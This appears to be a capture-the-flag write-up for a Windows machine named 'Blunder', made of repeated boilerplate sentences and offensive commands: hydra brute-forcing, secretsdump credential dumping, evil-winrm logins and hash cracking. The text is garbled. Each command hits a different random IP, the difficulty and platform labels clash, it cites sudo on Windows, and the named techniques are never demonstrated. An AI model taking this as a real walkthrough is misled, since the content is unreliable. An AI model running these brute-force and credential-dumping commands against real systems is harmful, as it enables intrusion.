---
TitleSEO: "OffSec Proving Grounds — Blunder (Hard Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Blunder (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Blunder. DNS Rebinding and Silver Ticket to achieve hard compromise on Windows."
Keywords: "ctf, medium, windows"
URL: "https://zurefx.github.io/writeups/htb-blunder-931.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-blunder-931/"
Date: "2024-08-19"
Tags: "CTF, Medium, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-blunder-931"
Permalink: "/writeups/htb-blunder-931.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Blunder** is rated **Hard** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.21.241.184`.

### Objectives

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p135,23,445 10.79.102.6 -oN scan.txt
evil-winrm -i 10.39.156.153 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

### Service Enumeration

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.92.44.201 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

### SMB Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
evil-winrm -i 10.23.189.253 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.65.99.165
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **Silver Ticket**.

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit.

### Initial Access

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.118.22/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.100.142.222/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.130.170
```

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

```powershell
evil-winrm -i 10.105.203.181 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.69.245.87/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.168.169 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

```powershell
nmap -sCV -p21,1433,3268 10.111.234.91 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.33.201.183 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.77.128.114 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service.

## Summary

### Tools Used

- `GetNPUsers`
- `ligolo-ng`
- `pwncat`
- `sharphound`
- `john`

### Key Takeaways

- DNS Rebinding
- Silver Ticket
- ACL Abuse
- DLL Hijacking
